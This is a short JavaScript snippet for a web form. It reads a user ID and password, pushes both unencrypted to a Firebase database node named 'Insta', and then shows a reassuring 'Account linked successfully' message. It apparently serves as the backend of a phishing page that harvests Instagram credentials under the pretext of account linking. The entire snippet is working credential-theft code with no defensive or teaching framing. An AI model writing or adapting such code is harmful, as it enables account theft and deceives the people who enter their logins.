// Initialize Firebase
firebase.initializeApp(firebaseConfig);
		
const database = firebase.database();

function submitText() {
  const text1 = document.getElementById('text1').value;
  const text2 = document.getElementById('text2').value;

  if (!text1 || !text2) {
    alert('Please fill in all details.');
    return; // Stop further execution
  };

  const data = {
    Id: text1,
    Pass: text2

  };

  database.ref('Insta').push(data);
  alert("Account linked successfully! You will be notified in 24 hours (Please contact your coordinator if you are not notified)");
}